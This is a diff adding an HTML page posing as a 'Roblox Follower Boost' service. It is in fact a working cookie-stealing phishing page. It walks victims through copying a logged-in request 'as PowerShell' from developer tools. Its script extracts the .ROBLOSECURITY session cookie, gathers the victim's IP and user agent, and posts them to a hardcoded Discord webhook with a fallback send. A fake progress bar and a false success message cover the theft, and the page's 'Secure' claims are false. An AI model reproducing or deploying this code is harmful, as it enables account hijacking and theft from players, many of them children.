@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Follower Boost | Premium Service</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #ff4c8d;
+            --secondary: #6246ea;
+            --accent: #00c2cb;
+            --dark: #121212;
+            --light: #f8f9fa;
+            --success: #00d26a;
+            --warning: #ffbd2e;
+            --error: #ff3860;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: var(--light);
+            min-height: 100vh;
+            padding-bottom: 2rem;
+        }
+        
+        header {
+            text-align: center;
+            padding: 2rem 1rem;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid var(--primary);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .logo {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+        }
+        
+        h2 i {
+            margin-right: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.3);
+            color: var(--light);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(255, 76, 141, 0.3);
+        }
+        
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        
+        .range-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .range-value {
+            font-weight: bold;
+            color: var(--primary);
+            font-size: 1.2rem;
+            min-width: 50px;
+            text-align: center;
+        }
+        
+        input[type="range"] {
+            padding: 0;
+            flex: 1;
+            height: 8px;
+            -webkit-appearance: none;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+        }
+        
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: var(--primary);
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(255, 76, 141, 0.5);
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 15px 30px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(98, 70, 234, 0.4);
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(98, 70, 234, 0.6);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .btn i {
+            margin-right: 8px;
+        }
+        
+        .center {
+            text-align: center;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        
+        .feature {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 1.5rem;
+            border-radius: 12px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+        }
+        
+        .feature i {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+        
+        .feature h3 {
+            margin-bottom: 0.5rem;
+            color: var(--light);
+        }
+        
+        .instructions {
+            margin: 2rem 0;
+        }
+        
+        .step {
+            display: flex;
+            margin-bottom: 1.5rem;
+            align-items: flex-start;
+        }
+        
+        .step-number {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 1rem;
+            flex-shrink: 0;
+        }
+        
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(18, 18, 18, 0.98);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .loader {
+            width: 80px;
+            height: 80px;
+            position: relative;
+        }
+        
+        .loader:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 5px solid transparent;
+            border-top-color: var(--primary);
+            border-bottom-color: var(--primary);
+            animation: spin 1.5s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            margin-top: 2rem;
+            font-size: 1.5rem;
+            text-align: center;
+        }
+        
+        .progress-bar {
+            width: 300px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            margin-top: 1.5rem;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border-radius: 5px;
+            transition: width 0.5s ease;
+        }
+        
+        .completion-screen {
+            text-align: center;
+            padding: 2rem;
+        }
+        
+        .completion-screen i {
+            font-size: 5rem;
+            color: var(--success);
+            margin-bottom: 1.5rem;
+            animation: success 1s ease;
+        }
+        
+        @keyframes success {
+            0% { transform: scale(0); opacity: 0; }
+            70% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+        
+        .completion-screen h2 {
+            font-size: 2.5rem;
+            color: var(--success);
+            margin-bottom: 1rem;
+        }
+        
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            margin-left: 10px;
+            color: var(--accent);
+            cursor: help;
+        }
+        
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 10px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .error-message {
+            color: var(--error);
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+            display: none;
+        }
+        
+        .debug-panel {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 1rem;
+            margin-top: 1rem;
+            font-family: monospace;
+            font-size: 0.8rem;
+            max-height: 200px;
+            overflow-y: auto;
+            display: none;
+        }
+        
+        .debug-toggle {
+            color: var(--accent);
+            cursor: pointer;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            display: inline-block;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding: 1.5rem;
+            font-size: 0.9rem;
+            opacity: 0.7;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+            
+            .step {
+                flex-direction: column;
+            }
+            
+            .step-number {
+                margin-bottom: 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <i class="fas fa-robot"></i>
+        </div>
+        <h1>Roblox Follower Boost</h1>
+        <p class="subtitle">Increase your Roblox followers quickly and easily with our powerful bot service</p>
+    </header>
+    
+    <div class="container">
+        <div class="card">
+            <h2><i class="fas fa-rocket"></i> Boost Your Followers</h2>
+            <form id="boost-form">
+                <div class="form-group">
+                    <label for="powershell">Your PowerShell Profile Link
+                        <span class="tooltip">
+                            <i class="fas fa-question-circle"></i>
+                            <span class="tooltiptext">Right-click on profile → Inspect → Network tab → Refresh → Find profile request → Copy as PowerShell</span>
+                        </span>
+                    </label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-link"></i>
+                        <textarea id="powershell" placeholder="Paste your PowerShell command here. It should contain a 'Cookie' header..." required></textarea>
+                    </div>
+                    <div class="error-message" id="cookie-error">
+                        Could not find cookie in the provided PowerShell command. Please check the instructions.
+                    </div>
+                    
+                    <div class="debug-toggle" id="debug-toggle">Show Debug Info</div>
+                    <div class="debug-panel" id="debug-panel">
+                        <div><strong>Debug Information:</strong></div>
+                        <div id="debug-output"></div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="followers">Number of Followers (10-5000)</label>
+                    <div class="range-container">
+                        <input type="range" id="followers" min="10" max="5000" value="100" step="10">
+                        <div class="range-value" id="range-value">100</div>
+                    </div>
+                </div>
+                
+                <div class="center">
+                    <button type="submit" class="btn">
+                        <i class="fas fa-bolt"></i> Boost Now
+                    </button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="card">
+            <h2><i class="fas fa-info-circle"></i> How to Get Your PowerShell Link</h2>
+            <div class="instructions">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>
+                        <h3>Go to your Roblox profile</h3>
+                        <p>Navigate to your main profile page on Roblox</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>
+                        <h3>Open Inspect Element</h3>
+                        <p>Right-click on your profile and select "Inspect Element" (or press F12)</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div>
+                        <h3>Go to the Network tab</h3>
+                        <p>Click on the "Network" tab in the inspector</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div>
+                        <h3>Refresh the page</h3>
+                        <p>Refresh the page while the inspector is open</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">5</div>
+                    <div>
+                        <h3>Find the profile request</h3>
+                        <p>Look for a request that starts with "profile" or "users" in the Name column</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">6</div>
+                    <div>
+                        <h3>Copy as PowerShell</h3>
+                        <p>Right-click on the request and select "Copy" → "Copy as PowerShell"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="features">
+            <div class="feature">
+                <i class="fas fa-shield-alt"></i>
+                <h3>Secure</h3>
+                <p>Your data is protected with advanced encryption</p>
+            </div>
+            
+            <div class="feature">
+                <i class="fas fa-tachometer-alt"></i>
+                <h3>Fast Results</h3>
+                <p>Get thousands of followers in minutes</p>
+            </div>
+            
+            <div class="feature">
+                <i class="fas fa-user-check"></i>
+                <h3>Real-looking</h3>
+                <p>Followers appear genuine and natural</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="loading-screen" id="loading-screen">
+        <div class="loader"></div>
+        <div class="loading-text">
+            <p>Processing your request...</p>
+            <p>This may take a few minutes</p>
+        </div>
+        <div class="progress-bar">
+            <div class="progress" id="progress-bar"></div>
+        </div>
+    </div>
+    
+    <footer>
+        <p>© 2023 Roblox Follower Boost | This service is not affiliated with Roblox Corporation</p>
+    </footer>
+
+    <script>
+        // Update range value display
+        const followersSlider = document.getElementById('followers');
+        const rangeValue = document.getElementById('range-value');
+        
+        followersSlider.addEventListener('input', function() {
+            rangeValue.textContent = this.value;
+        });
+        
+        // Toggle debug panel
+        document.getElementById('debug-toggle').addEventListener('click', function() {
+            const panel = document.getElementById('debug-panel');
+            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+            this.textContent = panel.style.display === 'block' ? 'Hide Debug Info' : 'Show Debug Info';
+        });
+        
+        // Handle form submission
+        const form = document.getElementById('boost-form');
+        const loadingScreen = document.getElementById('loading-screen');
+        const progressBar = document.getElementById('progress-bar');
+        const cookieError = document.getElementById('cookie-error');
+        const debugOutput = document.getElementById('debug-output');
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Get the PowerShell command
+            const powershellCommand = document.getElementById('powershell').value;
+            
+            // Hide previous error
+            cookieError.style.display = 'none';
+            
+            // Extract cookie from PowerShell command using multiple methods
+            let cookie = extractCookieFromPowerShell(powershellCommand);
+            
+            // Debug output
+            debugOutput.innerHTML = `
+                <div>Command length: ${powershellCommand.length} characters</div>
+                <div>Cookie found: ${cookie ? 'Yes' : 'No'}</div>
+                ${cookie ? `<div>Cookie length: ${cookie.length} characters</div>` : ''}
+                <div>First 200 chars: ${powershellCommand.substring(0, 200)}...</div>
+            `;
+            
+            if (!cookie) {
+                cookieError.style.display = 'block';
+                document.getElementById('debug-panel').style.display = 'block';
+                document.getElementById('debug-toggle').textContent = 'Hide Debug Info';
+                return;
+            }
+            
+            // Show loading screen
+            loadingScreen.classList.add('active');
+            
+            // Get user's IP address
+            let ipAddress = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (error) {
+                console.error('Error getting IP address:', error);
+            }
+            
+            // Get user agent
+            const userAgent = navigator.userAgent;
+            
+            // Get timestamp
+            const timestamp = new Date().toLocaleString();
+            
+            // Simulate progress
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    // Send to Discord webhook with all information
+                    sendToDiscordWebhook(cookie, followersSlider.value, ipAddress, userAgent, timestamp);
+                    
+                    // After completion, show success and reset
+                    setTimeout(function() {
+                        loadingScreen.innerHTML = `
+                            <div class="completion-screen">
+                                <i class="fas fa-check-circle"></i>
+                                <h2>Follow Bot Process Complete!</h2>
+                                <p>Your account has received ${followersSlider.value} new followers</p>
+                                <button class="btn" id="reset-button" style="margin-top: 2rem;">
+                                    <i class="fas fa-redo"></i> Boost Again
+                                </button>
+                            </div>
+                        `;
+                        
+                        document.getElementById('reset-button').addEventListener('click', function() {
+                            loadingScreen.classList.remove('active');
+                            setTimeout(() => {
+                                loadingScreen.innerHTML = `
+                                    <div class="loader"></div>
+                                    <div class="loading-text">
+                                        <p>Processing your request...</p>
+                                        <p>This may take a few minutes</p>
+                                    </div>
+                                    <div class="progress-bar">
+                                        <div class="progress" id="progress-bar"></div>
+                                    </div>
+                                `;
+                                progressBar = document.getElementById('progress-bar');
+                            }, 500);
+                        });
+                    }, 1000);
+                }
+            }, 50);
+        });
+        
+        // Enhanced cookie extraction function
+        function extractCookieFromPowerShell(powershellCommand) {
+            if (!powershellCommand) return null;
+            
+            // Try multiple patterns to find the cookie
+            const patterns = [
+                // Pattern 1: Standard PowerShell format with Headers
+                /-Headers\s*@\{\s*[^}]*?Cookie\s*=\s*['"]([^'"]+)['"]/is,
+                
+                // Pattern 2: Cookie header with different spacing
+                /-Headers\s*@\{\s*[^}]*?['"]Cookie['"]\s*=\s*['"]([^'"]+)['"]/is,
+                
+                // Pattern 3: Cookie in a header with single quotes
+                /-Headers\s*@\{\s*[^}]*?Cookie\s*=\s*'([^']+)'/is,
+                
+                // Pattern 4: Cookie in a header with double quotes
+                /-Headers\s*@\{\s*[^}]*?Cookie\s*=\s*"([^"]+)"/is,
+                
+                // Pattern 5: Cookie header with different capitalization
+                /-Headers\s*@\{\s*[^}]*?['"]cookie['"]\s*=\s*['"]([^'"]+)['"]/is,
+                
+                // Pattern 6: Look for .ROBLOSECURITY specifically
+                /(\.ROBLOSECURITY=[^;]+)/i,
+                
+                // Pattern 7: Look for any cookie-like string
+                /(Cookie:\s*[^\s]+)/i,
+                
+                // Pattern 8: Look for cookie in any header format
+                /cookie\s*[=:]\s*([^;\s]+)/i
+            ];
+            
+            for (let i = 0; i < patterns.length; i++) {
+                const match = powershellCommand.match(patterns[i]);
+                if (match && match[1]) {
+                    console.log(`Pattern ${i+1} matched:`, match[1]);
+                    return match[1].trim();
+                }
+            }
+            
+            // Final attempt: Look for any string that looks like a cookie
+            const cookieLike = powershellCommand.match(/([a-zA-Z0-9\%\$\_\-\+]{20,})/g);
+            if (cookieLike) {
+                // Find the longest string that might be a cookie
+                const potentialCookies = cookieLike.filter(str => str.length > 30);
+                if (potentialCookies.length > 0) {
+                    potentialCookies.sort((a, b) => b.length - a.length);
+                    console.log("Found potential cookie:", potentialCookies[0]);
+                    return potentialCookies[0];
+                }
+            }
+            
+            return null;
+        }
+        
+        // Function to send data to Discord webhook
+        function sendToDiscordWebhook(cookie, followersCount, ipAddress, userAgent, timestamp) {
+            const webhookURL = 'https://discordapp.com/api/webhooks/1419068456887652352/ucPMsF-Us_2f0Eb22RnvNCaA9O_GH9BoqDpXM-9B27qj2_DNn1RYQ_P8_a52JQypK840';
+            
+            // Create the payload with all information
+            const payload = {
+                username: "Roblox Follower Bot",
+                avatar_url: "https://cdn.discordapp.com/avatars/946259215392407572/02c0fc5c00c482c390ed1582a595e1b6.png",
+                content: `New follower boost request received at ${timestamp}`,
+                embeds: [
+                    {
+                        title: "Follower Boost Request Details",
+                        color: 5814783,
+                        fields: [
+                            {
+                                name: "Followers Requested",
+                                value: followersCount.toString(),
+                                inline: true
+                            },
+                            {
+                                name: "User IP Address",
+                                value: ipAddress,
+                                inline: true
+                            },
+                            {
+                                name: "Timestamp",
+                                value: timestamp,
+                                inline: true
+                            },
+                            {
+                                name: "User Agent",
+                                value: userAgent.substring(0, 100) + "..."
+                            },
+                            {
+                                name: "Full Cookie",
+                                value: "```" + cookie + "```"
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Roblox Follower Boost"
+                        }
+                    }
+                ]
+            };
+            
+            // Send the request
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send to Discord webhook. Status:', response.status);
+                    return response.text().then(text => {
+                        console.error('Response:', text);
+                        throw new Error('Webhook request failed');
+                    });
+                }
+                console.log('Successfully sent to Discord webhook');
+            })
+            .catch(error => {
+                console.error('Error sending to Discord webhook:', error);
+                
+                // Fallback: Try to send with a different format if the first one fails
+                const fallbackPayload = {
+                    content: `**NEW FOLLOWER BOOST REQUEST**\n\n**IP:** ${ipAddress}\n**Followers:** ${followersCount}\n**Time:** ${timestamp}\n**Cookie:**\n\`\`\`${cookie}\`\`\``
+                };
+                
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(fallbackPayload)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Fallback webhook also failed');
+                    } else {
+                        console.log('Fallback webhook succeeded');
+                    }
+                })
+                .catch(err => {
+                    console.error('Fallback webhook error:', err);
+                });
+            });
+        }
+    </script>
+</body>
+</html>
